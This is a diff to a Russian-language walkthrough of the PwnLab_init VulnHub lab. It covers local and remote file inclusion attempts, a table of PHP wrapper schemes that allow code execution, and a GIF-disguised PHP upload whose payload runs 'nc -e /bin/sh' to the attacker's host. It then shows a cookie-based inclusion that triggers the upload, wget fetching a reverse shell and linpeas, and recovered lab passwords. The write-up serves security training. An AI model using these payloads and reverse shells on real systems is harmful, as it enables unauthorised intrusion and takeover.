@@ -228,7 +228,33 @@ config                  [Status: 200, Size: 405, Words: 17, Lines: 12, Duration:
 :: Progress: [1102735/1102735] :: Job [1/1] :: 1123 req/sec :: Duration: [0:22:34] :: Errors: 0 ::
 ```
 
-`%00` не работает для отбрасывания расширения, так что пробую читать содержимое доступных файлов
+`RFI` к **.php** файлу не сработал `http://192.168.56.127/index.php?page=http://192.168.56.106:8888/php-reverse-shell`
+ - `allow_url_include = Off` на целевом сервере, нет смысла пробовать передать код в `data://`
+
+Если бы было `allow_url_include = On` в `php.ini`, то можно было бы попробовать
+```
+http://target.com/vuln.php?file=data://text/plain,<?php system("id"); ?>
+http://target.com/vuln.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==
+http://target.com/vuln.php?file=expect://id
+```
+А также через post
+```bash
+curl -X POST -d "<?php system('nc 192.168.56.106 4444'); ?>" "http://192.168.56.127/index.php?page=php://input" 
+```
+
+🔐 **Полезные схемы**
+
+| Схема           | Риск                          | Условия работы                 |
+|----------------|-------------------------------|--------------------------------|
+| `php://input`  | RCE через POST                 | `allow_url_include=On`        |
+| `data://`      | RCE через inline-код           | `allow_url_include=On`        |
+| `expect://`    | Выполнение команд              | Модуль `expect` установлен    |
+| `phar://`      | RCE через архивы               | Доступ к загрузке файлов       |
+| `php://filter` | Чтение файлов / обход фильтров | Всегда доступен               |
+  
+  
+### Попытка отбросить расширение
+`%00` не работает для отбрасывания расширения, так что далее буду пробовать читать содержимое доступных файлов с помощью `php://filter/convert.base64-encode/resource=`
 
 ### login.php
 Использование `prepare` и `bind_param` защищает от SQL-инъекции, так как входные данные экранируются
@@ -308,9 +334,9 @@ if (isset($_COOKIE['lang']))
 ```
 **poc**
 ![cookie](screenshots/03.cookie.png)
-
-
-
+   
+   
+    
 ### upload.php
 Прямой загрузки реверс-шелла через `upload.php` без авторизации не получится, так как проверка `$_SESSION['user']` блокирует доступ
 ```php
@@ -448,17 +474,193 @@ MySQL [Users]>
 `root:H4u%QJ_H99` не подходит для аутентификации на сайте, вошел как `kent:JWzXuBJJNy`  
 
 Загружаю **png** файл размером 95 байт, чтобы посмотреть запрос.
-Загруженный файл отображается в `/uploads`
+Загруженный файл отображается в `/uploads/`
 ![upload](screenshots/02.upload.png)
 
-
+Имя генерируется, как и написано в коде **php**, с помощью **md5**  
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Easy - PwnLab_init/exploits]
+└─$ echo -n "1x1.png" | md5sum                             
+ca56c702061e583af4bb4b38e0d51de3  -
+```
 
 
 ## 📂 Получение доступа
 
+Загружаю на сайт **reverse shell**  
+```php
+POST /?page=upload HTTP/1.1
+Host: 192.168.56.127
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=----geckoformboundary523ec894ec88275e72cf06a63a27b888
+Content-Length: 383
+Origin: http://192.168.56.127
+Connection: keep-alive
+Referer: http://192.168.56.127/?page=upload
+Cookie: PHPSESSID=m9fra4gu6lbj17fvqo2u93flf3
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+------geckoformboundary523ec894ec88275e72cf06a63a27b888
+Content-Disposition: form-data; name="file"; filename="aaa.gif"
+Content-Type: image/gif
+
+GIF89a<?php system('nc -e /bin/sh 192.168.56.106 4444'); ?>
+------geckoformboundary523ec894ec88275e72cf06a63a27b888
+Content-Disposition: form-data; name="submit"
+
+Upload
+------geckoformboundary523ec894ec88275e72cf06a63a27b888--
+```
+
+В ответе получаю расположение загруженного файла: `upload/cc4815dae10b7407415261ef0256ed75.gif`
+
+Далее это значение нужно вставить в куку **lang** для **LFI**, делаю это также в **Burp**  
+```php
+GET /index.php?page=php://filter/convert.base64-encode/resource=config HTTP/1.1
+Host: 192.168.56.127
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Cookie: lang=../upload/cc4815dae10b7407415261ef0256ed75.gif
+
+
+```
+
+Получаю реверс и немного улучшаю его  
+```bash
+┌──(kali㉿0x2d-pentest)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.106] from (UNKNOWN) [192.168.56.127] 53841
+pwd
+/var/www/html
+python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@pwnlab:/var/www/html$ 
+```
+
+Запускаю сервер, чтобы загрузить **reverse shell** от **pentestmonkey**  
+```bash
+┌──(kali㉿0x2d-pentest)-[/usr/share/webshells/php]
+└─$ python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+```
+
+И загружаю постоянную страницу `shell.php` для удобства дальнейшей эксплуатации  
+```bash
+www-data@pwnlab:/var/www/html$ ls -la
+ls -la
+total 28
+drwxr-xr-x 3 www-data www-data 4096 Mar 17  2016 .
+drwxr-xr-x 4 www-data www-data 4096 Jul 20 21:07 ..
+-rwxr-xr-x 1 www-data www-data  105 Mar 16  2016 config.php
+drwxr-xr-x 2 www-data www-data 4096 Mar 17  2016 images
+-rwxr-xr-x 1 www-data www-data  623 Mar 16  2016 index.php
+-rwxr-xr-x 1 www-data www-data  832 Mar 17  2016 login.php
+lrwxrwxrwx 1 root     root        5 Mar 17  2016 upload -> /tmp/
+-rwxr-xr-x 1 www-data www-data 1339 Mar 16  2016 upload.php
+www-data@pwnlab:/var/www/html$ which wget
+which wget
+/usr/bin/wget
+www-data@pwnlab:/var/www/html$ wget http://192.168.56.106:8888/php-reverse-shell.php -O shell.php
+<ml$ wget http://192.168.56.106:8888/php-reverse-shell.php -O shell.php      
+converted 'http://192.168.56.106:8888/php-reverse-shell.php' (ANSI_X3.4-1968) -> 'http://192.168.56.106:8888/php-reverse-shell.php' (UTF-8)
+--2025-07-21 19:15:21--  http://192.168.56.106:8888/php-reverse-shell.php
+Connecting to 192.168.56.106:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5496 (5.4K) [application/octet-stream]
+Saving to: 'shell.php'
+
+shell.php           100%[=====================>]   5.37K  --.-KB/s   in 0s     
+
+2025-07-21 19:15:21 (1.18 GB/s) - 'shell.php' saved [5496/5496]
+
+www-data@pwnlab:/var/www/html$
+```
+
+Перехожу в браузере в шелл `http://192.168.56.127/shell.php`  
+
+И немного улучшаю  
+```bash
+┌──(kali㉿0x2d-pentest)-[~]
+└─$ nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [192.168.56.106] from (UNKNOWN) [192.168.56.127] 56261
+Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
+ 19:16:39 up  3:53,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@pwnlab:/$ export TERM=xterm
+export TERM=xterm
+www-data@pwnlab:/$ stty rows 50 columns 132
+stty rows 50 columns 132
+www-data@pwnlab:/$ which socat
+which socat
+www-data@pwnlab:/$ 
+```
 
 
 ## ⚙️ Привилегии
+
+Перехожу в директорию `/tmp/`, где у меня есть возможность записи.
+Скачиваю `linpeas.sh` и запускаю  
+```bash
+www-data@pwnlab:/tmp$ wget http://192.168.56.106:8888/linpeas.sh
+wget http://192.168.56.106:8888/linpeas.sh
+www-data@pwnlab:/tmp$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+www-data@pwnlab:/tmp$ ./linpeas.sh
+```
+
+### Система  
+```bash
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Basic information ╠═══════════════════════════════                               
+                               ╚═══════════════════╝                                                              
+OS: Linux version 3.16.0-4-686-pae (debian-kernel@lists.debian.org) (gcc version 4.8.4 (Debian 4.8.4-1) ) #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29)
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Hostname: pwnlab
+```
+
+### Пользователи  
+```bash
+╔══════════╣ Users with console
+john:x:1000:1000:,,,:/home/john:/bin/bash                                                                         
+kane:x:1003:1003:,,,:/home/kane:/bin/bash
+kent:x:1001:1001:,,,:/home/kent:/bin/bash
+mike:x:1002:1002:,,,:/home/mike:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+```
+
+### Soft
+```bash
+╔══════════╣ Useful software
+/usr/bin/base64                                                                                                   
+/usr/bin/gcc
+/bin/nc
+/bin/nc.traditional
+/bin/netcat
+/usr/bin/perl
+/usr/bin/php
+/bin/ping
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python2.7
+/usr/bin/wget
+╔══════════╣ Installed Compilers
+ii  gcc                           4:4.9.2-2                   i386         GNU C compiler                         
+ii  gcc-4.9                       4.9.2-10                    i386         GNU C compiler
+/usr/bin/gcc
+```
 
 
 
